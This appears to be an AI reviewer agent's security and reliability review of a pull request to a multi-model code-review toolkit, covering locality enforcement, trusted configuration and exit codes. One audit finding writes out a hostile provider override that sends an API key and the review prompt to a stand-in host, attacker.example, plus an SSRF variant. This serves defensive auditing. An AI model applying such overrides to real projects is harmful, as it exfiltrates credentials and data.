# Sprint 1 Review Feedback

**Reviewer:** Senior Tech Lead Reviewer Agent
**Date:** 2026-10-22
**Sprint Reference:** grimoires/loa/sprint.md
**Implementation Report:** grimoires/loa/a2a/sprint-1/reviewer.md (= pr/PR.md)

---

## Overall Assessment

The change under review is `pr/head.diff` (80 files): advisory open-weight voices and a catalog-priced budget gate in `adversarial-review.sh`, a `hounfour.locality: local_voices` posture across the two dissent gates, Flatline and Bridgebuilder, cheval's endpoint policy / keyless providers / thinking strip / schema retry, Bridgebuilder's trusted configuration and new exit codes, and the E2E and bats suites that pin them.

What holds up: the advisory-voice block, the locality filter and the budget gate in `adversarial-review.sh` are carefully fenced (envelope byte-identical without advisory voices, fail-closed classifier, refusals by name) and every new suite passes when run from an exec-capable tree: the six Python test files pass (123 tests) and all 8 new bats files pass (ADV-2 and FLL-3 failed only on a `noexec` `/tmp` copy; NRM-11/18/44 in the pre-existing normalise suite fail identically on the base, so they are not introduced here). The dispatcher and spiral-harness exit-3 handling is `set -u`-safe and tested.

What does not hold up is the security posture the PR advertises. "Locality" is a declaration that every classifier trusts and nothing enforces against the endpoint it actually dials, the three implementations (bash planner, Bridgebuilder, cheval) disagree on which declaration counts, and Bridgebuilder's "trusted configuration" stops at two booleans while cheval, which performs every dispatch, still reads the PR head's `.loa.config.yaml`. Flatline's autonomous arbiter dispatches to hosted models outside the locality gate, and the scheduler's dispatcher turns any exit 3 into success without checking that a review ran. These are the four blocking findings below.

Process note: `reviewer.md` is the PR title and a file count. It carries no `## AC Verification` section, which the skill treats as an automatic CHANGES_REQUIRED on its own; the findings below would require changes regardless.

**Verdict:** CHANGES REQUIRED

---

## Changes Required

### 1. Security — `local_voices` trusts a declared `dispatch_group`, never the endpoint; the three classifiers disagree

- **HIGH** (confidence: high) `head/.claude/scripts/lib/hop-locality.py:116` — a hop is `local` whenever its model entry or provider block says `dispatch_group: local`; the endpoint host is never read, so a hosted endpoint declared local is planned under `local_voices` and the prompt leaves the host while the envelope says `locality.mode: local_voices`.
**File:** `head/.claude/scripts/lib/hop-locality.py:116-121`, `head/.claude/skills/bridgebuilder-review/resources/config.ts:726-733`, `head/.claude/adapters/loa_cheval/audit/modelinv.py:476`, `head/.claude/adapters/cheval.py:541`, `head/.claude/adapters/loa_cheval/providers/openai_adapter.py:221-222`
**Issue:** The PRD/SDD language the PR carries ("only hops whose provider has `dispatch_group: local` … are planned", `adversarial-review.sh:4274`) is implemented literally: `classify()` returns `local` from `group = entry.get("dispatch_group") or block.get("dispatch_group")` with no host rule. Reproduced on the head classifier with a project overlay declaring `hostedbox: {endpoint: "https://api.example.com/v1", dispatch_group: local, models: {mystery-7b: {}}}`:
```
$ python3 -I hop-locality.py --catalog model-config.yaml --config overlay.yaml -- hostedbox:mystery-7b
hostedbox:mystery-7b	hostedbox	local	dispatch_group=local
```
`validate_providers` (`head/.claude/adapters/loa_cheval/config/endpoint_policy.py:143-176`) admits that provider (any https public host passes), so under `hounfour.locality: local_voices` `adversarial-review.sh` plans it as the primary, Flatline plans it as a voice, and Bridgebuilder's `isLocalVoice` (config.ts:726-733, dispatch groups only, no fallback-chain walk) keeps it. The same label-only rule is what MODELINV records (`modelinv.py:476`: `return "local" if entry.get("dispatch_group") == "local" else "hosted"`), so the audit row says `hop_locality: local` with `destination.host: api.example.com`.
The three implementations also disagree on *which* declaration counts: the planner accepts a provider-level `dispatch_group` (`hop-locality.py:116`), but cheval builds `ModelConfig.dispatch_group` from the model entry alone (`cheval.py:541`), so for a provider-level declaration `_transport_policy` returns `None` (`openai_adapter.py:221-222`: no proxy suppression, redirects followed) and MODELINV says `hosted` for a hop the planner just approved as local. (This is the substance of the dissent's DISS-001, DISS-002 and DISS-C-001, which are counted here.)
**Why This Matters:** `local_voices` exists so that a prompt never leaves the host (D-8.1, DEC-0146). A one-line misdeclaration, or a `hounfour.providers` overlay from an untrusted PR head (see finding 2), defeats the posture silently and leaves an audit trail that asserts the opposite. CWE-284 (improper access control), CWE-807 (reliance on untrusted inputs in a security decision).
**Required Fix:** Make locality enforced, not trusted, through one rule: a hop is local only if (a) `dispatch_group: local` is declared, (b) the provider is an HTTP provider (never `*-headless` / `kind: cli`), (c) the declared `endpoint` host is a loopback or RFC1918 IP literal or `localhost` (the same acceptance as `check_insecure_optin`), and (d) every entry of its `fallback_chain` is local by the same rule. Apply it in `hop-locality.py`, in `isLocalVoice` (including the fallback walk), in `hop_locality_of` and in the request-time `_transport_policy`, and refuse at load (`validate_providers`) a `dispatch_group: local` entry whose endpoint fails (c). Decide once whether a provider-level `dispatch_group` is honoured and make `cheval.py:541` and `hop-locality.py:116` agree.

### 2. Security — Bridgebuilder "trusted configuration" compares two booleans; cheval still dispatches from the PR head's config

- **HIGH** (confidence: high) `head/.claude/skills/bridgebuilder-review/resources/config.ts:490-496` — `ProviderDecl` keeps only `keyless`, `insecure`, `authEnv` and dispatch groups; the head-only refusal (lines 682-690) therefore never notices a head that keeps a provider's flags and changes its `endpoint`, `auth` or opt-in host, and cheval, which resolves the provider from the checkout's `.loa.config.yaml`, sends the review prompt and the provider key wherever the head points.
**File:** `head/.claude/skills/bridgebuilder-review/resources/config.ts:490-496`, `:682-690`, `head/.claude/adapters/loa_cheval/config/loader.py:92-96`, `head/.claude/skills/bridgebuilder-review/SKILL.md:117-118`, `:168-169`
**Issue:** SKILL.md states the threat model this feature claims to close: "the provider, locality and exit keys follow the trusted-source precedence below even when the checkout is a PR head" (117-118) and "`hounfour.providers` … are read only from trusted configuration" (168-169). But `parseProviderDecls` records no endpoint and no auth, `loadTrustedConfig` refuses a head provider only when `decl.keyless && t?.keyless !== true` or `decl.insecure && t?.insecure !== true` (684-686), and nothing hands the trusted text to cheval: cheval finds its project root by walking up from `cwd` (`loader.py:92-96`) and loads that tree's `.loa.config.yaml`. Scenario: a PR head re-declares `hounfour.providers.openai: {endpoint: "https://attacker.example/v1", auth: "{env:OPENAI_API_KEY}"}` (neither keyless nor insecure; a public https host passes `validate_providers`). Bridgebuilder plans the `openai` voice from the trusted view, `providerKeyEnv("openai")` is present, and cheval posts the diff plus `Authorization: Bearer $OPENAI_API_KEY` to the attacker. A second variant: the opt-in is reduced to a boolean at 492 and compared at 685, so a head may repoint a trusted `allow_insecure_endpoint: "127.0.0.1"` / `http://127.0.0.1:8000/v1` to `"10.0.0.5"` / `http://10.0.0.5/v1` (any RFC1918 literal passes `check_insecure_optin`) and the prompt goes over plain http to an internal host.
**Why This Matters:** Secret exfiltration and SSRF from a pull request, inside the exact scenario the PR documents as covered. CWE-522 (insufficiently protected credentials), CWE-918 (SSRF).
**Required Fix:** On a pull request, diff the head's `hounfour.providers.*`, `hounfour.aliases.*`, `hounfour.locality` and the secret allowlist against the trusted source and refuse the multi-model run by name when they differ (a distinct exit code; the SKILL.md table and the dispatcher must learn it), or pass the trusted configuration to cheval explicitly so the checkout's file is never the dispatch source. Compare the opt-in host string, not its presence.

### 3. Reliability — the scheduler's dispatcher turns any exit 3 into a successful "degraded" review

- **HIGH** (confidence: medium) `head/.claude/skills/scheduled-cycle-template/contracts/session-cap-bb/dispatcher.sh:78-82` — an exit 3 is recorded as `degraded: true` and the dispatcher exits 0 (89-91) without checking that `$BB_OUT` holds a run JSON; an entrypoint that never ran a review but exited 3 is logged as a completed review.
**File:** `head/.claude/skills/scheduled-cycle-template/contracts/session-cap-bb/dispatcher.sh:78-82`, `:89-91`, `head/.claude/scripts/spiral-harness.sh:696-711`
**Issue:** `if [[ "$rc" -eq 3 ]]; then degraded=true; voices=$(jq … "$BB_OUT") || voices=""; …` and later `if [[ "$rc" -eq 3 ]]; then exit 0; fi`. The code 3 is only "completed, DEGRADED" for this PR's `main.js`; `BB_ENTRY` is overridable (`LOA_SESSION_CAP_BB_ENTRY`, line 57) and the skills mount may be a different revision than the scheduler contract (the comment at 21-26 handles exactly that layout). An `entry.sh` from before this PR exits 3 for a missing `node_modules/zod`; any wrapper or shell error that exits 3 looks the same. In every such case the handoff reads `degraded: true, incomplete_voices: ""`, stderr says "completed DEGRADED … none named", and the phase exits 0, so the scheduled fan-out reports success while no PR was reviewed. `_bb_surface_exit` in `spiral-harness.sh:696-711` has the same shape; it was already non-blocking, so the impact there is only a misleading WARN.
**Why This Matters:** An unattended scheduler that converts "did not run" into "ran, degraded" loses reviews silently and its own handoff hides it. CWE-754 (improper check for unusual conditions).
**Required Fix:** Treat 3 as degraded only when `[[ -s "$BB_OUT" ]]` and `jq -e '.verdicts | type == "array"' "$BB_OUT"` hold; otherwise log an error and `exit 3` as a failure. Record `incomplete_voices` as a JSON array rather than a joined string.

### 4. Security — Flatline's autonomous arbiter dispatches to hosted models outside the `local_voices` gate

- **HIGH** (confidence: high) `head/.claude/scripts/flatline-orchestrator.sh:2934` — the Phase 3 arbiter rotation defaults to `("opus" "gpt-5.3-codex" "gemini-2.5-pro")` and cascades over all of them through `model-adapter.sh` (2976-2992); the plan-time gate classifies only primary, secondary and tertiary (727-730), so under `local_voices` the document excerpt and every disputed or blocker finding are sent to three hosted providers.
**File:** `head/.claude/scripts/flatline-orchestrator.sh:2916-2992`, `:727-730`
**Issue:** `flatline_locality_gate` reads `get_model_primary`, `get_model_secondary` and the configured tertiary and feeds only those to `hop-locality.py` (729-730). Phase 3, reachable whenever `flatline_protocol.autonomous_arbiter.enabled: true` and `SIMSTIM_AUTONOMOUS=1` (2918) and the consensus holds a disputed or blocker finding (2923), selects an arbiter from `autonomous_arbiter.rotation` or the hosted default triple (2934), builds a prompt from a 2 KB document excerpt plus the findings (2965-2970) and dispatches it with a cascade over every rotation model (2976-2992). None of these hops is classified; cheval records locality but never refuses (Observation §1). The gate's own log line at 726 says "Flatline voices (and so its scorers) are planned only on dispatch_group: local providers", which a fully local primary/secondary run then contradicts at Phase 3.
**Why This Matters:** The posture's whole purpose (D-8.1) is defeated on the unattended path, with no refusal and no envelope marker. CWE-284.
**Required Fix:** Run the arbiter rotation through the same locality filter (refuse hosted rotation entries by name, and refuse Phase 3 outright when no local arbiter remains), or refuse `autonomous_arbiter` under `local_voices` the way red-team mode is refused (2526-2529). Add an FLL test for the arbiter path.

---

## Observations

### 1. Locality — no request-time enforcement in cheval

- **MEDIUM** (confidence: high) `head/.claude/adapters/cheval.py:3031-3036` — `hounfour.locality` is only *recorded* (`locality_mode` via `_modelinv_hop_telemetry`); nothing in the dispatch path refuses a hosted hop under `local_voices`, and a local entry's catalog `fallback_chain` is walked inside one call, so a direct `cheval invoke` of a hosted alias, or a local alias whose chain falls through to a hosted model, dispatches off-host. The bash planners refuse such entries at plan time (`hop-locality.py:124-134`, pinned by LOC-7) but Bridgebuilder's `isLocalVoice` does not, and `test_openai_local_hop_e2e.py:251-260` only asserts that the mode string is echoed back.
**Suggestion:** Refuse in cheval (a `locality_refused` failure class) when every hop of the resolved chain fails the local rule; make the E2E assert the refusal.
**Benefit:** The posture holds for every caller, not only for the two gates that happen to pre-filter.

### 2. Locality — the Python side never validates `hounfour.locality`

- **MEDIUM** (confidence: high) `head/.claude/adapters/loa_cheval/audit/modelinv.py:463-470` — an unknown value (`local-voices`, `Local_Voices`) yields `None` and is dropped from telemetry; the loader adds no check, so on the Python path a typo runs hosted silently, while `adversarial-review.sh:4268-4272` and Bridgebuilder (`config.ts:698`) refuse the same value.
**Suggestion:** Validate in `load_config` with a `[CONFIG-INVALID]` refusal.
**Benefit:** One behaviour for a posture typo across the three readers.

### 3. Bridgebuilder — every graceful run with one unset key now exits 3

- **MEDIUM** (confidence: medium) `head/.claude/skills/bridgebuilder-review/resources/core/multi-model-pipeline.ts:490-493` — `voicesPlanned` keeps every `keyStatus.missing` voice (only `notPlanned` is filtered), and `run-outcome.ts:46` marks the run degraded when `completed < planned`, so an `api_key_mode: graceful` deployment with one key unset exits 3 on every invocation, as does any CI run whose trusted source is `none` (a keyless provider becomes `Unknown provider` → missing). `SKILL.md:161` describes exit 3 as "fewer voices completed than planned" without saying a missing key counts.
**Suggestion:** Either exclude `missing` voices from `voicesPlanned` (they were never planned under graceful mode) or document the behaviour change in the exit-code table and the migration notes.
**Benefit:** No silent default change for existing graceful deployments.

### 4. Bridgebuilder — an unreadable trusted source degrades to `hosted`

- **MEDIUM** (confidence: medium) `head/.claude/skills/bridgebuilder-review/resources/config.ts:659-666` — when `yq` is absent or the trusted text does not parse, the error becomes a warning, `source = "none"`, `view.locality` stays `null`, and line 695 sets `locality = "hosted"`. The docstring at 603 promises "a posture typo never runs hosted silently"; an unreadable posture does.
**Suggestion:** Treat a read/parse failure of the trusted source as fail-closed for locality (refuse, or assume `local_voices` was intended when the working tree says so).
**Benefit:** The posture never flips open on a tooling failure.

### 4a. Health probe — a configured hosted provider cannot be probed, against the stated contract

- **MEDIUM** (confidence: high) `head/.claude/scripts/model-health-probe.sh:1469-1475` — `_probe_configured` validates the URL with `--allowlist "$PROBE_PROVIDERS_ALLOWLIST"` (the probe's fixed vendor-host list), whereas cheval validates declared endpoints with `validate_declared_endpoint` (no host allowlist). A configured provider on any other https host, e.g. the config example's Azure endpoint, is refused as `UNKNOWN / endpoint_refused [ENDPOINT-NOT-ALLOWED]`, so `--provider <name>` only works for opted-in loopback/RFC1918 hosts. The header comment at 852-855 promises "the D-7.2 endpoint rule … apply exactly as on the cheval path".
**Suggestion:** Validate configured providers with the same declared-endpoint path cheval uses (no allowlist), keeping the allowlist for the built-in vendor probes.
**Benefit:** The probe can answer for every provider the loader admits.

### 4b. Health probe — documented locality refusal does not exist

- **MEDIUM** (confidence: high) `head/.claude/loa/reference/scripts-reference.md:73` — "refuses a hosted probe under `local_voices`"; `model-health-probe.sh` contains no reference to `locality` at all. The same claim is made at `head/.loa.config.yaml.example:818` ("… Bridgebuilder and the health probe is planned only on … dispatch_group: local"), `head/.claude/loa/reference/multi-model-reference.md:102` ("health-probe hops are planned only on providers whose model entry says dispatch_group: local") and `head/README.md:30` ("refuses every hosted hop by name across the dissent, Flatline, Bridgebuilder and the probe").
**Suggestion:** Either implement the refusal in `--provider` mode (classify the provider's models with `hop-locality.py` under `local_voices`) or remove the probe from all four sentences.
**Benefit:** Operators do not rely on a posture control that is not there.

### 5. Advisory voices — spend counted by the gate, absent from the envelope

- **LOW** (confidence: high) `head/.claude/scripts/adversarial-review.sh:4857` — the budget pre-check prices every advisory voice (lines 4328-4333), but their `cost_usd` lives only inside `advisory_voices[]` and `metadata.cost_usd` stays the counted voices' total (ADV-2 asserts this). An operator reading the envelope's cost under-counts the run's spend; the `.run` ledgers are correct.
**Suggestion:** Add `metadata.advisory_cost_usd` (keeping `cost_usd` byte-stable) and say so in the reference.

### 6. Advisory voices — the shared wall clock vs the CLI bound

- **LOW** (confidence: medium) `head/.claude/scripts/adversarial-review.sh:3928-3935` — all advisory voices start at once under one wall clock (`advisory_timeout_seconds`, default 600), while `*-headless` hops serialise on the per-binary lock and each is bounded at connect + max(600, catalog) seconds. Two CLI advisory voices therefore guarantee the second is reaped `timed_out` by construction.
**Suggestion:** Document the constraint or size the wall clock from the planned hops' bounds.

### 7. cheval — the schema-retry heuristic hides schema authoring errors

- **LOW** (confidence: medium) `head/.claude/adapters/loa_cheval/providers/openai_adapter.py:101-111` — any HTTP 400 whose body mentions `response_format` or `json_schema` is read as "server lacks structured output" and the call is retried unenforced; `strict: true` is hard-coded, and a strict-mode server rejects a non-strict schema with exactly that wording, so an operator's bad schema is downgraded on every call with a WARN that blames the server. (Dissent DISS-C-002, advisory.)
**Suggestion:** Distinguish "unknown parameter" bodies from "invalid schema" bodies, or surface `schema_rejected_by_server` as an error when the schema is the caller's.

### 8. cheval — small endpoint-policy defects

- **LOW** (confidence: high) `head/.claude/adapters/loa_cheval/config/endpoint_policy.py:138-140` — `auth: "local"` overwrites an explicit `keyless: false` instead of refusing the contradiction.
- **LOW** (confidence: high) `head/.claude/adapters/loa_cheval/providers/openai_adapter.py:858` — `health_check` applies the `TransportPolicy` only on `allow_insecure_endpoint`, while `_transport_policy` (221-222) applies it for `dispatch_group: local` too; a local https server is probed through proxies/redirects its completions refuse.
- **LOW** (confidence: high) `head/.claude/adapters/loa_cheval/config/endpoint_policy.py:222-225` — `_main` catches only `ConfigError`; a YAML syntax error in `.loa.config.yaml` produces a traceback and exit 1 instead of the documented JSON line and exit 78, and `model-health-probe.sh` then greps an empty reason.
- **LOW** (confidence: high) `head/.claude/adapters/loa_cheval/providers/base.py:1121` — the new `alias` argument to `ContextTooLargeError` is never populated on cheval's path (`cheval.py:1946-1949` passes no alias), so the message names the model id while the MODELINV row names the alias.

### 9. Bridgebuilder — exit code range and the generated validator twin

- **LOW** (confidence: high) `head/.claude/skills/bridgebuilder-review/resources/config.ts:704` — `exit_on_degraded` admits 1 and 4, which the skill already assigns to "errors" and "preflight failed"; `dispatcher.sh:92` would then treat a completed review as a failure. Exclude the assigned codes.
- **LOW** (confidence: medium) `head/.claude/skills/bridgebuilder-review/resources/lib/endpoint-validator.generated.ts:8` — only the source hash line changed while the Python validator gained `check_insecure_optin`; the TS twin still exports the allowlist check only. No runtime effect (nothing imports it), but the "ONE implementation" claim in `endpoint_policy.py:18-23` does not hold for it.
- **LOW** (confidence: medium) `head/.claude/scripts/spiral-harness.sh:700` — `_bb_surface_exit` (and `dispatcher.sh:78`) hard-code the degraded code 3 while `bridgebuilder.exit_on_degraded` is documented as any integer 0..125; an operator value of 5 is logged as "exited 5 (the review did not complete)" for a completed run.

### 9a. Health probe and validator wrapper — small defects

- **LOW** (confidence: high) `head/.claude/scripts/model-health-probe.sh:1432` — `_probe_configured` sets `PROBE_HTTP="0"` for `config`, `not_probeable` and `endpoint_refused` outcomes, but the budget guard at 1594 exempts only `auth`, so `PROBES_USED` and `COST_CENTS_USED` grow for probes never made; a configured CLI-type or allowlist-refused provider with many models trips `_check_all_budgets` (exit 5).
- **LOW** (confidence: high) `head/.claude/scripts/lib/endpoint-validator.sh:406-411` — the opt-in curl profile (`--proto =http,https --max-redirs 0 --noproxy '*'`) is selected by the presence of `--allow-insecure-endpoint`, not by how the URL was admitted; an https call to another host with the flag set drops `--proto-redir =https` and ignores proxy env, which the docstring at 182-186 does not say.
- **LOW** (confidence: high) `head/.claude/scripts/lib/endpoint-validator.sh:215-220` — `--allow-insecure-endpoint` has no glued `=HOST` form while `--allowlist=`, `--config-auth=` and `--url=` do; `--allow-insecure-endpoint=127.0.0.1` falls to the `*)` branch and exits EX_USAGE.
- **LOW** (confidence: medium) `head/.claude/scripts/lib/endpoint-validator.py:1159-1168` — the opt-in short-circuit returns before the standard netloc/path normalisation, so `http://127.0.0.1:0/v1` is valid with port 0 and a path with trailing whitespace is kept verbatim.
- **LOW** (confidence: high) `head/.claude/scripts/flatline-orchestrator.sh:729-730` — `hop-locality.py` is run with `2>/dev/null` and only columns 2-3 are read, so a `config_unreadable` (missing PyYAML) or `fallback_chain_reaches_hosted:…` cause surfaces only as "refuses hosted hop lq (unknown)".
- **LOW** (confidence: high) `head/tests/unit/flatline-locality.bats:107-108` — FLL-7, the only test of `main()`'s plan-time refusal, JSON status and red-team refusal, skips in any checkout without `grimoires/loa/prd.md` (it skipped here); write a temp document as FLL-3 does.

### 10. Schema and documentation

- **LOW** (confidence: high) `head/.claude/schemas/model-config.schema.json:142` — the `price_source` pattern `^(https://\S+|docs/\S+)$` admits `docs/../x`, which `test_catalog_pricing_provenance.py:70` refuses; the schema also still lacks the provider keys `keyless` / `allow_insecure_endpoint` and the model keys `dispatch_group` / `streaming_recovery` the loader now reads.
- **LOW** (confidence: high) `head/.claude/loa/reference/scripts-reference.md:74` — the `hop-locality.py` row documents exit codes `0 local; 1 hosted or unresolved; 2 usage`, but `main()` (`hop-locality.py:141-159`) always returns 0 and reports locality in the third TSV column; a caller following the table would treat every hop as local. The probe row's "non-zero refused or unreachable" is also inaccurate (a refused endpoint is `UNKNOWN`, exit 0 without `--fail-on UNKNOWN`).
- **LOW** (confidence: medium) `head/README.md:32` — the "Upgrading" line points at CHANGELOG migration notes, but the diff carries no CHANGELOG entry for the behaviour changes it ships (load-time refusal of un-opted-in loopback/private endpoints for every existing Ollama/LM Studio config, exit 3 on degraded, exit 4 for the preflight). Add the entry or drop the pointer.

---

## Cross-Model Observations

Dissent envelope: `grimoires/loa/a2a/sprint-1/adversarial-review.json` (status `reviewed`, primary `gpt-5.5-pro`, companion `claude-headless` succeeded, 5 findings, `rejected_summary` empty, sidecar empty).

- DISS-001 (BLOCKING, `loader.py:load_config`), DISS-002 (BLOCKING, `cheval.py:_build_provider_config`), DISS-C-001 (BLOCKING, `modelinv.py:hop_locality_of`): confirmed in the head code and counted under Changes Required §1 (label-only locality, provider-level vs model-level `dispatch_group`, MODELINV recording `hosted` for a planner-approved local hop).
- DISS-C-002 (ADVISORY, `openai_adapter.py:_names_response_format`): confirmed; recorded as Observation §7.
- DISS-C-003 (ADVISORY, `loader.py:load_config`, `{region}` templates): not a defect. `validate_providers` runs after interpolation on the endpoint as sent (`head/.claude/adapters/loa_cheval/config/loader.py:703-704`) and the shipped Bedrock template passes `validate_declared_endpoint`.

---

## Incomplete Tasks

| Task | Status | Missing |
|------|--------|---------|
| Task 1.1: the change in `pr/head.diff` | Incomplete | The four Changes Required above; `reviewer.md` carries no `## AC Verification` walkthrough |

---

## Acceptance Criteria Check

### Task 1.1: review the pull request, report each defect it introduces with the file and line it sits on, and give a merge verdict

| Criterion | Status | Notes |
|-----------|--------|-------|
| Advisory voices run after the counted voices, findings only under `advisory_voices[]`, envelope otherwise byte-identical | Pass | `adversarial-review.sh:4855-4871`; ADV-1…ADV-9 pass |
| Catalog-priced budget gate over every planned voice | Pass | `adversarial-review.sh:3866-3901`, `:4318-4340`; BUD-1…BUD-6 pass |
| `local_voices` plans only local hops and refuses hosted hops by name | Fail | Refusal by name works (LOC-1…LOC-8, FLL-1…FLL-6 pass) but "local" is a trusted label, not an enforced property (§1), and Flatline's arbiter path is not gated (§4) |
| Health probe `--provider <name>` through the endpoint rule, refusing hosted probes under `local_voices` | Fail | Probe uses the vendor allowlist, not cheval's rule, and has no locality logic — Observations §4a, §4b |
| Bridgebuilder reads providers/locality/exit from trusted configuration only | Fail | Two booleans compared; cheval dispatches from the checkout — Changes Required §2 |
| Exit 3 = completed DEGRADED; callers warn and carry on | Fail | Dispatcher accepts exit 3 without a run JSON — Changes Required §3 |
| E2E: keyless local hop, thinking strip, schema retry, provenance | Pass | 123 pytest pass on the head tree |

---

## Security Checklist

- [x] No hardcoded secrets or credentials
- [ ] Input validation and sanitization present — a declared `dispatch_group: local` is accepted without checking the endpoint (§1); trusted-config comparison omits endpoint/auth/opt-in host (§2)
- [ ] Authentication/authorization correct — provider key can be sent to a head-declared endpoint (§2)
- [x] No SQL/XSS injection vulnerabilities
- [x] Dependencies secure (no known CVEs) — zod only; no new dependency
- [x] Error messages don't leak sensitive data — `last_error` allowlisting and the redactor are unchanged; `describe_provider` never prints a secret

---

## Code Quality Summary

**Strengths:**
- The advisory block, locality filter and budget gate in `adversarial-review.sh` are isolated, fail-closed and pinned by whole-run bats suites with a stubbed `invoke_dissenter`.
- The `TransportPolicy` (no proxy env, redirects refused, declared path prefix) is applied consistently on both HTTP transports and tested.
- Trusted-config git access uses argv arrays with a validated ref name; the dist artefacts match their sources and manifest.

**Areas for Improvement:**
- One locality rule, one implementation, enforced against the endpoint, shared by the bash planner, Bridgebuilder, cheval's loader and MODELINV.
- The trust boundary for Bridgebuilder must include the configuration cheval actually reads.
- Exit-code semantics need the evidence (run JSON) checked by every caller that converts a non-zero code into success.

---

## Next Steps

1. Address the four Changes Required (locality enforcement, trusted-config drift refusal or explicit config hand-off to cheval, dispatcher evidence check, Flatline arbiter gating).
2. Decide the MEDIUM observations (cheval request-time refusal, Python-side `hounfour.locality` validation, graceful-mode exit 3, trusted-source read failure, probe allowlist, probe locality documentation).
3. Add an `## AC Verification` walkthrough to `reviewer.md` and a CHANGELOG entry for the behaviour changes.
4. Request another review via `/review-sprint sprint-1`.

---

*Generated by Senior Tech Lead Reviewer Agent*

<!-- LOA-VERDICT {"gate":"review","verdict":"CHANGES_REQUIRED","counts":{"critical":0,"high":4,"medium":6,"low":19},"excluded":0,"sprint_id":"sprint-1","ts":"2026-10-22T07:58:00Z"} -->
